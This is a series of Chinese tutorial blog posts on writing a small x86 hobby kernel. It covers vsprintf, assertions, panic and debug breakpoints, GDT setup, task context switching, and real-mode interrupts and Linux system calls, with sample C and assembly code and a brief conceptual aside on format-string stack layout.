// 若数字个数小于精度值，则 str 中放入（精度值-i）个&#x27;0&#x27; while (i &lt; precision--) *str++ = &#x27;0&#x27;; // 将转数值换好的数字字符填入 str 中，共 i 个 while (i-- &gt; 0) *str++ = tmp[i]; // 若宽度值仍大于零 // 则表示 flags 标志中有左对齐标志标志 // 则在剩余宽度中放入空格 while (size-- &gt; 0) *str++ = &#x27; &#x27;; return str;&#125;int vsprintf(char *buf, const char *fmt, va_list args)&#123; int len; int i; // 用于存放转换过程中的字符串 char *str; char *s; int *ip; // number() 函数使用的标志 int flags; int field_width; // 输出字段宽度 int precision; // min 整数数字个数；max 字符串中字符个数 int qualifier; // &#x27;h&#x27;, &#x27;l&#x27; 或 &#x27;L&#x27; 用于整数字段 // 首先将字符指针指向 buf // 然后扫描格式字符串， // 对各个格式转换指示进行相应的处理 for (str = buf; *fmt; ++fmt) &#123; // 格式转换指示字符串均以 &#x27;%&#x27; 开始 // 这里从 fmt 格式字符串中扫描 &#x27;%&#x27;，寻找格式转换字符串的开始 // 不是格式指示的一般字符均被依次存入 str if (*fmt != &#x27;%&#x27;) &#123; *str++ = *fmt; continue; &#125; // 下面取得格式指示字符串中的标志域，并将标志常量放入 flags 变量中 flags = 0; repeat: // 掉过第一个 % ++fmt; switch (*fmt) &#123; // 左对齐调整 case &#x27;-&#x27;: flags |= LEFT; goto repeat; // 放加号 case &#x27;+&#x27;: flags |= PLUS; goto repeat; // 放空格 case &#x27; &#x27;: flags |= SPACE; goto repeat; // 是特殊转换 case &#x27;#&#x27;: flags |= SPECIAL; goto repeat; // 要填零(即&#x27;0&#x27;)，否则是空格 case &#x27;0&#x27;: flags |= ZEROPAD; goto repeat; &#125; // 取当前参数字段宽度域值，放入 field_width 变量中 field_width = -1; // 如果宽度域中是数值则直接取其为宽度值 if (is_digit(*fmt)) field_width = skip_atoi(&amp;fmt); // 如果宽度域中是字符 &#x27;*&#x27;，表示下一个参数指定宽度 else if (*fmt == &#x27;*&#x27;) &#123; ++fmt; // 因此调用 va_arg 取宽度值 field_width = va_arg(args, int); // 若此时宽度值小于 0，则该负数表示其带有标志域 &#x27;-&#x27; 标志（左对齐） if (field_width &lt; 0) &#123; // 因此还需在标志变量中添入该标志，并将字段宽度值取为其绝对值 field_width = -field_width; flags |= LEFT; &#125; &#125; // 取格式转换串的精度域，并放入 precision 变量中 precision = -1; // 精度域开始的标志是&#x27;.&#x27; 其处理过程与上面宽度域的类似 if (*fmt == &#x27;.&#x27;) &#123; ++fmt; // 如果精度域中是数值则直接取其为精度值 if (is_digit(*fmt)) precision = skip_atoi(&amp;fmt); // 如果精度域中是字符&#x27;*&#x27;，表示下一个参数指定精度 else if (*fmt == &#x27;*&#x27;) &#123; // 因此调用 va_arg 取精度值 precision = va_arg(args, int); &#125; // 若此时宽度值小于 0，则将字段精度值取为其绝对值 if (precision &lt; 0) precision = 0; &#125; // 下面这段代码分析长度修饰符，并将其存入 qualifer 变量 qualifier = -1; if (*fmt == &#x27;h&#x27; || *fmt == &#x27;l&#x27; || *fmt == &#x27;L&#x27;) &#123; qualifier = *fmt; ++fmt; &#125; // 下面分析转换指示符 switch (*fmt) &#123; // 如果转换指示符是&#x27;c&#x27;，则表示对应参数应是字符 case &#x27;c&#x27;: // 此时如果标志域表明不是左对齐， if (!(flags &amp; LEFT)) // 则该字段前面放入 (宽度域值 - 1) 个空格字符，然后再放入参数字符 while (--field_width &gt; 0) *str++ = &#x27; &#x27;; *str++ = (unsigned char)va_arg(args, int); // 如果宽度域还大于 0，则表示为左对齐 // 则在参数字符后面添加 (宽度值-1) 个空格字符 while (--field_width &gt; 0) *str++ = &#x27; &#x27;; break; // 如果转换指示符是 &#x27;s&#x27;，则表示对应参数是字符串 case &#x27;s&#x27;: s = va_arg(args, char *); // 首先取参数字符串的长度 len = strlen(s); // 若其超过了精度域值, 则扩展精度域=字符串长度 if (precision &lt; 0) precision = len; else if (len &gt; precision) len = precision; // 此时如果标志域表明不是左对齐 if (!(flags &amp; LEFT)) // 则该字段前放入 (宽度值-字符串长度) 个空格字符 while (len &lt; field_width--) *str++ = &#x27; &#x27;; // 然后再放入参数字符串 for (i = 0; i &lt; len; ++i) *str++ = *s++; // 如果宽度域还大于 0，则表示为左对齐 // 则在参数字符串后面，添加(宽度值-字符串长度)个空格字符 while (len &lt; field_width--) *str++ = &#x27; &#x27;; break; // 如果格式转换符是&#x27;o&#x27;，表示需将对应的参数转换成八进制数的字符串 case &#x27;o&#x27;: str = number(str, va_arg(args, unsigned long), 8, field_width, precision, flags); break; // 如果格式转换符是&#x27;p&#x27;，表示对应参数的一个指针类型 case &#x27;p&#x27;: // 此时若该参数没有设置宽度域，则默认宽度为 8，并且需要添零 if (field_width == -1) &#123; field_width = 8; flags |= ZEROPAD; &#125; str = number(str, (unsigned long)va_arg(args, void *), 16, field_width, precision, flags); break; // 若格式转换指示是 &#x27;x&#x27; 或 &#x27;X&#x27; // 则表示对应参数需要打印成十六进制数输出 case &#x27;x&#x27;: // &#x27;x&#x27;表示用小写字母表示 flags |= SMALL; case &#x27;X&#x27;: str = number(str, va_arg(args, unsigned long), 16, field_width, precision, flags); break; // 如果格式转换字符是&#x27;d&#x27;, &#x27;i&#x27; 或 &#x27;u&#x27;，则表示对应参数是整数 case &#x27;d&#x27;: case &#x27;i&#x27;: // &#x27;d&#x27;, &#x27;i&#x27;代表符号整数，因此需要加上带符号标志 flags |= SIGN; // &#x27;u&#x27;代表无符号整数 case &#x27;u&#x27;: str = number(str, va_arg(args, unsigned long), 10, field_width, precision, flags); break; // 若格式转换指示符是 &#x27;n&#x27; // 表示要把到目前为止转换输出的字符数保存到对应参数指针指定的位置中 case &#x27;n&#x27;: // 首先利用 va_arg() 取得该参数指针 ip = va_arg(args, int *); // 然后将已经转换好的字符数存入该指针所指的位置 *ip = (str - buf); break; default: // 若格式转换符不是 &#x27;%&#x27;，则表示格式字符串有错 if (*fmt != &#x27;%&#x27;) // 直接将一个 &#x27;%&#x27; 写入输出串中 *str++ = &#x27;%&#x27;; // 如果格式转换符的位置处还有字符，则也直接将该字符写入输出串中 // 然后继续循环处理格式字符串 if (*fmt) *str++ = *fmt; else // 否则表示已经处理到格式字符串的结尾处，则退出循环 --fmt; break; &#125; &#125; // 最后在转换好的字符串结尾处添上字符串结束标志 *str = &#x27;\\0&#x27;; // 返回转换好的字符串长度值 i = str - buf; return i;&#125;// 结果按格式输出字符串到 bufint sprintf(char *buf, const char *fmt, ...)&#123; va_list args; va_start(args, fmt); int i = vsprintf(buf, fmt, args); va_end(args); return i;&#125; 可以改写src/kernel/main.c了 123456789101112131415161718192021#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); int count=31; while(count--) &#123; // console_write(message, sizeof(message) - 1); printk(&quot;hello xsys %#010d\\n&quot;, count); &#125; return;&#125; 字符串格式化漏洞の一点补充 在之前的文章里面讲过了，但是这次可以从新的视角出发 123456789#include &lt;stdio.h&gt;int main()&#123; char msg[] = &quot;XSYS\\n&quot;; int a = 10; printf(&quot;hello %d %s %d %d\\n&quot;, a, msg, 0xaa, 0xff); return 0;&#125; 1gcc -m32 -g -o test test.c 这里使用32位是为了不让参数传到寄存器中，这样参数在栈上面方便调试 gcc这里使用的时标准的cdecl(c declearation)，所以我们的参数是从右往左入栈，及图中的4个push 在call之前的栈如下 所以当vsprintf检测到格式化字符串时，他就会将栈顶的值按照提前预定的格式输出出来。 所以对字符串格式化漏洞利用来说，重要的是call vsprintf时，栈的情况 操作系统实现-断言与调试 代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 断言 如果要判断一个条件是否成立，可以有 1234if (exp) ....;else ERROR; 每个判断都这样写的话会导致代码异常难读，所以可以使用一个函数assert()来实现 而我们的assert()肯定要打印出错的代码文件、哪一行、报错提示信息 不过还好之前我们在printk中实现了这一点 src/include/xsys/assert.h 1234567891011121314#ifndef XSYS_ASSERT_H#define XSYS_ASSERT_Hvoid assertion_failure(char *exp, char *file, char *base, int line);#define assert(exp) \\ if (exp) \\ ; \\ else \\ assertion_failure(#exp, __FILE__, __BASE_FILE__, __LINE__)void panic(const char *fmt, ...);#endif src/kernel/assert.c 12345678910111213141516171819202122#include &lt;xsys/assert.h&gt;#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/printk.h&gt;static u8 buf[1024];void assertion_failure(char *exp, char *file, char *base, int line)&#123; printk( &quot;\\n--&gt; assert(%s) failed!!!\\n&quot; &quot;--&gt; file: %s \\n&quot; &quot;--&gt; base: %s \\n&quot; &quot;--&gt; line: %d \\n&quot;, exp, file, base, line); spin(&quot;assertion_failure()&quot;); // 不可能走到这里，否则出错； asm volatile(&quot;ud2&quot;);&#125; src/kernel/main.c 12345678910111213141516171819#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;// #include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); assert(3&lt;5); assert(3&gt;5); return;&#125; PANIC 慌乱 当我们代码过多，测试阶段不可避免地会写一些bug，可能导致例如：x/0这种，会触发系统的崩溃，所以我们要对这种致命错误(Fatal Error)要有处理 src/kernel/assert.c 12345678910111213void panic(const char *fmt, ...)&#123; va_list args; va_start(args, fmt); int i = vsprintf(buf, fmt, args); va_end(args); printk(&quot;!!! panic !!!\\n--&gt; %s \\n&quot;, buf); spin(&quot;panic()&quot;); // 不可能走到这里，否则出错； asm volatile(&quot;ud2&quot;);&#125; src/kernel/main.c 123456789101112131415161718#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;// #include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); panic(&quot;test!!!\\n&quot;); return;&#125; 调试 bochs中的断点是：xchg bx,bx 所以我们通过裸汇编来实现断点，同时显示停止在了那个文件的哪一行 src/include/xsys/debug.h 123456789#ifndef XSYS_DEBUG_H#define XSYS_DEBUG_Hvoid debug_k(char* file, int line, const char* fmt, ...);#define BMB asm volatile (&quot;xchgw %bx, %bx&quot;)#define DEBUGK(fmt, args...) debug_k(__BASE_FILE__, __LINE__, fmt, ##args)#endif src/kernel/debug.c 1234567891011121314#include &lt;xsys/debug.h&gt;#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/stdio.h&gt;static char buf[1024];void debug_k(char* file, int line, const char* fmt, ...)&#123; va_list args; va_start(args, fmt); vsprintf(buf, fmt, args); printk(&quot;[%s] [%d] %s&quot;, file, line, fmt);&#125; src/kernel/main.c 1234567891011121314151617181920#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); BMB; assert(3&lt;5); DEBUGK(&quot;debug test&quot;); return;&#125; 操作系统实现-内核全局描述符|进程调度及上下文切换 内核全局描述符 将loader.asm里面全局描述功能放到内核里面（确实，你不觉得这样汇编一位一位的设置很麻烦吗？） 12descriptor_t gdt[GDT_SIZE]; // 内核全局描述符表pointer_t gdt_ptr; // 内核全局描述符表指针 之前的汇编 12lgdt [gdt_ptr]; 加载 gdtsgdt [gdt_ptr]; 保存 gdt src/include/xsys/global.h 123456789101112131415161718192021222324252627282930313233343536373839404142#ifndef ONIX_GLOBAL_H#define ONIX_GLOBAL_H#include &lt;xsys/types.h&gt;#define GDT_SIZE 128// 全局描述符typedef struct descriptor_t /* 共 8 个字节 */&#123; unsigned short limit_low; // 段界限 0 ~ 15 位 unsigned int base_low : 24; // 基地址 0 ~ 23 位 16M unsigned char type : 4; // 段类型 unsigned char segment : 1; // 1 表示代码段或数据段，0 表示系统段 unsigned char DPL : 2; // Descriptor Privilege Level 描述符特权等级 0 ~ 3 unsigned char present : 1; // 存在位，1 在内存中，0 在磁盘上 unsigned char limit_high : 4; // 段界限 16 ~ 19; unsigned char available : 1; // 该安排的都安排了，送给操作系统吧 unsigned char long_mode : 1; // 64 位扩展标志 unsigned char big : 1; // 32 位 还是 16 位; unsigned char granularity : 1; // 粒度 4KB 或 1B unsigned char base_high; // 基地址 24 ~ 31 位&#125; _packed descriptor_t;// 段选择子typedef struct selector_t&#123; u8 RPL : 2; u8 TI : 1; u16 index : 13;&#125; selector_t;// 全局描述符表指针typedef struct pointer_t&#123; u16 limit; u32 base;&#125; _packed pointer_t;void gdt_init();#endif src/kernel/global.c 1234567891011121314151617181920212223#include &lt;xsys/global.h&gt;#include &lt;xsys/string.h&gt;#include &lt;xsys/debug.h&gt;descriptor_t gdt[GDT_SIZE]; // 内核全局描述符表pointer_t gdt_ptr; // 内核全局描述符表指针// 初始化内核全局描述符表void gdt_init()&#123; BMB; DEBUGK(&quot;init gdt!!!\\n&quot;); asm volatile(&quot;sgdt gdt_ptr&quot;); memcpy(&amp;gdt, (void *)gdt_ptr.base, gdt_ptr.limit + 1); gdt_ptr.base = (u32)&amp;gdt; gdt_ptr.limit = sizeof(gdt) - 1; BMB; asm volatile(&quot;lgdt gdt_ptr\\n&quot;); BMB;&#125; src/kernel/main.c 123456789101112131415161718#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); gdt_init(); return;&#125; 这里是MBR最开始的GDT，也是第一个断点 在执行lgdt ds:addr后 这样就扩充到了127个GDT 拓展 在linux内核中是如何实现的 到了保护模式，内存管理分为段式，和段页式，也就是段模式必不可少 对段模式来说，访问一个内存仍然用的【段基地址：偏移地址】 GDT：把这些长度为64bit的段描述符放入一个数组中，而将段寄存器中的值作为下标索引来间接引用 段描述符 ​ 同样的在源码中有 ​ /arch/x86/include/asm/desc_defs.h 12345678910111213141516171819202122232425262728293031323334353637#ifndef __ASSEMBLY__#include &lt;linux/types.h&gt;/* 8 byte segment descriptor */struct desc_struct &#123; u16 limit0; u16 base0; u16 base1: 8, type: 4, s: 1, dpl: 2, p: 1; u16 limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;&#125; __attribute__((packed));#define GDT_ENTRY_INIT(flags, base, limit) \\ &#123; \\ .limit0 = (u16) (limit), \\ .limit1 = ((limit) &gt;&gt; 16) &amp; 0x0F, \\ .base0 = (u16) (base), \\ .base1 = ((base) &gt;&gt; 16) &amp; 0xFF, \\ .base2 = ((base) &gt;&gt; 24) &amp; 0xFF, \\ .type = (flags &amp; 0x0f), \\ .s = (flags &gt;&gt; 4) &amp; 0x01, \\ .dpl = (flags &gt;&gt; 5) &amp; 0x03, \\ .p = (flags &gt;&gt; 7) &amp; 0x01, \\ .avl = (flags &gt;&gt; 12) &amp; 0x01, \\ .l = (flags &gt;&gt; 13) &amp; 0x01, \\ .d = (flags &gt;&gt; 14) &amp; 0x01, \\ .g = (flags &gt;&gt; 15) &amp; 0x01, \\ &#125;.../* LDT or TSS descriptor in the GDT. */...struct desc_ptr &#123; unsigned short size; unsigned long address;&#125; __attribute__((packed)) ; 在/arch/x86/include/asm/desc.h定义了一个描述符数组，则为gdt 123struct gdt_page &#123; struct desc_struct gdt[GDT_ENTRIES];&#125; __attribute__((aligned(PAGE_SIZE))); 最后更具这个找到gdt的相关应用就行了 进程调度及上下文切换 在32位下，参数传递是通过栈传递的，但是具体的信息会保存到寄存器中，所以我们为了不修改寄存器的值，有一套调用规则。主要有SystemV规则和Posix规则 ​ System V The System V Interface Definition (SVID) is a standard that describes the AT&amp;T UNIX System V behavior, including that of system calls, C libraries, available programs and devices. ​ Posix Portable Operating System Interface standards specified by IEEE to define application programming interface (API). POSIX covers all the three forms of IPC cdecl 函数实参在线程栈上按照从右至左的顺序依次压栈。 函数结果保存在寄存器EAX/AX/AL中 调用者负责从线程栈中弹出实参（即清栈） 受到函数调用影响的寄存器（volatile registers）：EAX, ECX, EDX, ST0 - ST7, ES, GS 不受函数调用影响的寄存器： EBX, EBP, ESP, EDI, ESI, CS, DS 因为函数调用的时候不受函数调用影响的寄存器： EBX, EBP, ESP, EDI, ESI, CS, DS，我们简化为EBX、ESI、EDI，所以我们需要保存这些 src/kernel/schedule.asm 1234567891011121314151617181920212223global task_switchtask_switch: push ebp mov ebp, esp push ebx push esi push edi mov eax, esp; and eax, 0xfffff000; current mov [eax], esp mov eax, [ebp + 8]; next mov esp, [eax] pop edi pop esi pop ebx pop ebp ret 为了理解上面的其他细节，我们假设有这么一种情况：我们同时有两个函数（任务|进程）A、B，两者需要相互切换，且连两个程序跑起来的时候都是在栈上面，其中的栈就是内核栈(kernel stack) 1234typedef struct task_t&#123; u32 *stack; // 内核栈&#125; task_t; 因为系统是32位的，所以栈可以暂时表示32位数组 进程创建的时候，我们要初始化进程相对应的栈 1234567891011121314static void task_create(task_t *task, target_t target)&#123; u32 stack = (u32)task + PAGE_SIZE; stack -= sizeof(task_frame_t); task_frame_t *frame = (task_frame_t *)stack; frame-&gt;ebx = 0x11111111; frame-&gt;esi = 0x22222222; frame-&gt;edi = 0x33333333; frame-&gt;ebp = 0x44444444; frame-&gt;eip = (void *)target; task-&gt;stack = (u32 *)stack;&#125; 当A向B切换的时候，我们就需要得到当前进程的内存地址，保存相关信息（EBX ESI EDI），这个相关信息就是任务上下文 调度函数可有： 123456void schedule()&#123; task_t *current = running_task(); task_t *next = current == a ? b : a; task_switch(next);&#125; 那么对于最开始的schedule.asm就有： 最开始的保存栈信息 将 ebx esi edi 压入栈保存 将当前栈顶esp转到eax上面，再将eax&amp;0xfffff000得到下一个任务的地址，再将当前栈顶转移到下一个任务地址中 将传入的next值转移到eax中作为返回值，再将下一个任务的地址转到栈顶中 最后再pop恢复栈平衡，返回后就可以到下一个任务了 src/include/xsys/task.h 123456789101112131415161718192021222324#ifndef XSYS_TASK_H#define XSYS_TASK_H#include &lt;xsys/types.h&gt;typedef u32 target_t();typedef struct task_t&#123; u32 *stack; // 内核栈&#125; task_t;typedef struct task_frame_t&#123; u32 edi; u32 esi; u32 ebx; u32 ebp; void (*eip)(void);&#125; task_frame_t;void task_init();#endif src/kernel/task.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;xsys/task.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/debug.h&gt;#define PAGE_SIZE 0x1000task_t *a = (task_t *)0x1000;task_t *b = (task_t *)0x2000;extern void task_switch(task_t *next);task_t *running_task()&#123; asm volatile( &quot;movl %esp, %eax\\n&quot; &quot;andl $0xfffff000, %eax\\n&quot;);&#125;void schedule()&#123; task_t *current = running_task(); task_t *next = current == a ? b : a; task_switch(next);&#125;u32 thread_a()&#123; while (true) &#123; printk(&quot;A&quot;); schedule(); &#125;&#125;u32 thread_b()&#123; while (true) &#123; printk(&quot;B&quot;); schedule(); &#125;&#125;static void task_create(task_t *task, target_t target)&#123; u32 stack = (u32)task + PAGE_SIZE; stack -= sizeof(task_frame_t); task_frame_t *frame = (task_frame_t *)stack; frame-&gt;ebx = 0x11111111; frame-&gt;esi = 0x22222222; frame-&gt;edi = 0x33333333; frame-&gt;ebp = 0x44444444; frame-&gt;eip = (void *)target; task-&gt;stack = (u32 *)stack;&#125;void task_init()&#123; task_create(a, thread_a); task_create(b, thread_b); schedule();&#125; src/kernel/main.c 1234567891011121314151617181920#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/task.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); gdt_init(); task_init(); return;&#125; 调试 有如下两个断点 这里的汇编我无法定位到具体文件，所以得gdb看一下了 得到current=0x1000 再通过task_switch切换 当前任务（A）的值被压入了栈中，然后再次得到当前栈的信息，之后将esp信息保存到*eax即0x1000中 再将下一个任务的地址放入到esp中 然后我们就可以切换到任务B的栈 小总结 目前的工程文件树： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263joe1sn@ubuntu:~/Desktop/os2$ tree.├── build│ ├── boot│ │ ├── boot.bin│ │ └── loader.bin│ ├── kernel│ │ ├── assert.o│ │ ├── console.o│ │ ├── debug.o│ │ ├── global.o│ │ ├── io.o│ │ ├── main.o│ │ ├── printk.o│ │ ├── schedule.o│ │ ├── start.o│ │ └── task.o│ ├── kernel.bin│ ├── lib│ │ ├── string.o│ │ └── vsprintf.o│ ├── master.img│ ├── system.bin│ └── system.map└── src ├── bochsrc ├── boot │ ├── boot.asm │ └── loader.asm ├── include │ └── xsys │ ├── assert.h │ ├── console.h │ ├── debug.h │ ├── global.h │ ├── io.h │ ├── printk.h │ ├── stdarg.h │ ├── stdio.h │ ├── string.h │ ├── task.h │ ├── types.h │ └── xsys.h ├── kernel │ ├── assert.c │ ├── console.c │ ├── debug.c │ ├── global.c │ ├── io.asm │ ├── main.c │ ├── printk.c │ ├── schedule.asm │ ├── start.asm │ └── task.c ├── lib │ ├── string.c │ └── vsprintf.c ├── makefile └── tests ├── test └── test.c11 directories, 48 files 文件启动方式 引用 https://en.wikipedia.org/wiki/X86_calling_conventions#syscall https://github.com/StevenBaby/onix 操作系统实现-中断与系统调用 使用Linux的系统调用 从汇编出发，一般来说的第一个程序是hello_world 123456789101112131415[bits 32]section .textglobal _start_start: mov ebx, 0 mov ecx, message mov edx, 13 mov eax, 4 int 0x80 retsection .datamessage: db &quot;hello world&quot;,10,13,0 这里使用了linux的int 0x80系统调用（调用表：https://www.joe1sn.top/int80.html ），调用的是write %eax Name Source %ebx %ecx %edx %ecx %edi 1 sys_exit kernel/exit.c int - - - - 2 sys_fork arch/i386/kernel/process.c struct pt_regs - - - - 3 sys_read fs/read_write.c unsigned int char * size_t - - 4 sys_write fs/read_write.c unsigned int const char * size_t - - ebx是选择IO通道（那个流） ecx是字符串的物理位置 edx是要打印的字符个数 eax是int 0x80要选择的系统调用号 1nasm -f elf32 hello_world.asm -o hello_world.o &amp;&amp; ld -m elf_i386 hello_world.o -o hello_world &amp;&amp; ./hello_world 因为我们直返回后程序没有退出的指令，所以出现了段错误 再次使用exit系统调用就可以避免这个错误了 12345678910111213141516[bits 32]section .textglobal _start_start: mov ebx, 0 mov ecx, message mov edx, 13 mov eax, 4 int 0x80 mov eax, 1 int 0x80section .datamessage: db &quot;hello world&quot;,10,13,0 实现一个系统调用 系统调用是基于中断实现的 一个普遍的思想就是操作系统是一个死循环，当满足一个条件时，中断循环去执行触发的功能(函数)（windows的点击-&gt;打开一个窗口），执行完成过后回到死循环。 修改我们的src/boot/boot.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00xchg bx,bxmov word [0x80 * 4], interruptmov word [0x80 * 4 + 2], 0int 0x80 ;linux系统调用 invoke 注册cs:ip;程序悬停jmp $interupt: mov si, string call print xchg bx,bx iret ;中断返回;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retstring: db &quot;.&quot;,0; \\n\\rerror: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;填充times 510-($-$$) db 0db 0x55,0xaa 这里所有的一切都是先入为主的观念，因为我们并不了解上面hello_world的原理，我们在下一节从验证现在了解的知识 其中有： 123456xchg bx,bxmov word [0x80 * 4], interruptmov word [0x80 * 4 + 2], 0xchg bx,bxint 0x80 ;linux系统调用 invoke 注册cs:ipxchg bx,bx 我们将0x80*4的位置放入了interrupt的地址，下个断点看一下 我们成功的将interrupt函数的地址放到了int 0x80调用表的第0个位置，如果我们想使用int 0x70调用，就用： 123456xchg bx,bxmov word [0x70 * 4], interruptmov word [0x70 * 4 + 2], 0xchg bx,bxint 0x70 ;invoke 注册cs:ipxchg bx,bx 效果是一样的 再复习一下之前的知识：ds=0时，ds:0x100 的物理地址是0∗010h+100h=100h0*010h+100h=100h0∗010h+100h=100h 接着实现除0异常的系统调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00; -------------------除0异常mov word [0 * 4], interruptmov word [0 * 4 + 2], 0mov dx, 0mov ax, 1mov bx, 0xchg bx, bxdiv bx; -------------------;程序悬停jmp $interrupt: mov si, string call print xchg bx,bx iret ;中断返回;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retstring: db &quot;.&quot;,0; \\n\\rerror: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;填充times 510-($-$$) db 0db 0x55,0xaa 12345678mov word [0 * 4], interruptmov word [0 * 4 + 2], 0mov dx, 0mov ax, 1mov bx, 0xchg bx, bxdiv bx 其中对1、2行完成了中断函数的注册（覆盖了原始的除0异常函数），接着就是一个除0异常，我们在interrupt函数处下了断点 这样每次除0异常都会调用interrupt函数 移除所有断点，系统就一直死循环跑 程序一直打印.说明iret返回的地址并不是中断发生时后的地址，而是引发异常代码开始的地址，即除0操作的地址 大意描述为：eip = &amp;div_0，同时我们的操作并没有修改相关寄存器的值，所以这个异常会被一直引发下去。 目前这个是我们自己注册的系统调用，你是否想过最开始int 0x10的BIOS系统调用是怎么样的？ 这里有bochs实模式下的内存布局情况 起始地址 结束地址 大小 用途 0x000 0x3FF 1KB 中断向量表 0x400 0x4FF 256B BIOS 数据区 0x500 0x7BFF 29.75 KB 可用区域 0x7C00 0x7DFF 512B MBR 加载区域 0x7E00 0x9FBFF 607.6KB 可用区域 0x9FC00 0x9FFFF 1KB 扩展 BIOS 数据区 0xA0000 0xAFFFF 64KB 用于彩色显示适配器 0xB0000 0xB7FFF 32KB 用于黑白显示适配器 0xB8000 0xBFFFF 32KB 用于文本显示适配器 0xC0000 0xC7FFF 32KB 显示适配器 BIOS 0xC8000 0xEFFFF 160KB 映射内存 0xF0000 0xFFFEF 64KB-16B 系统 BIOS 0xFFFF0 0xFFFFF 16B 系统 BIOS 入口地址 再次回到Linux系统调用 虽然我的内核版本是Linux ubuntu 5.4.0-100-generic #113~18.04.1-Ubuntu，但是这里用v2.6.3的源代码说明原理 /arch/i386/kernel/entry.S 1234567891011121314151617181920212223ENTRY(system_call) pushl %eax # save orig_eax SAVE_ALL GET_THREAD_INFO(%ebp) cmpl $(nr_syscalls), %eax jae syscall_badsys # system call tracing in operation testb $_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp) jnz syscall_trace_entrysyscall_call: call *sys_call_table(,%eax,4) movl %eax,EAX(%esp) # store the return valuesyscall_exit: cli # make sure we don&#x27;t miss an interrupt # setting need_resched or sigpending # between sampling and the iret movl TI_FLAGS(%ebp), %ecx testw $_TIF_ALLWORK_MASK, %cx # current-&gt;work jne syscall_exit_workrestore_all: RESTORE_ALL............ 这里就体现了demo工程与实际工程的不同 push eax到栈 保存一些相关的值/arch/alpha/kernel/entry.S 使用EBP来保存当前线程的信息 根据EAX的值选择适当的系统调用 /arch/um/kernel/sys_call_table.c 12345678910111213141516171819202122232425262728293031syscall_handler_t *sys_call_table[] = &#123; [ __NR_restart_syscall ] = sys_restart_syscall, [ __NR_exit ] = sys_exit, [ __NR_fork ] = sys_fork, [ __NR_read ] = (syscall_handler_t *) sys_read, [ __NR_write ] = (syscall_handler_t *) sys_write, /* These three are declared differently in asm/unistd.h */ [ __NR_open ] = (syscall_handler_t *) sys_open, [ __NR_close ] = (syscall_handler_t *) sys_close, [ __NR_waitpid ] = (syscall_handler_t *) sys_waitpid, [ __NR_creat ] = sys_creat, [ __NR_link ] = sys_link, [ __NR_unlink ] = sys_unlink, /* declared differently in kern_util.h */ [ __NR_execve ] = (syscall_handler_t *) sys_execve, [ __NR_chdir ] = sys_chdir, [ __NR_time ] = um_time, [ __NR_mknod ] = sys_mknod, [ __NR_chmod ] = sys_chmod, [ __NR_lchown ] = sys_lchown16, [ __NR_break ] = sys_ni_syscall, 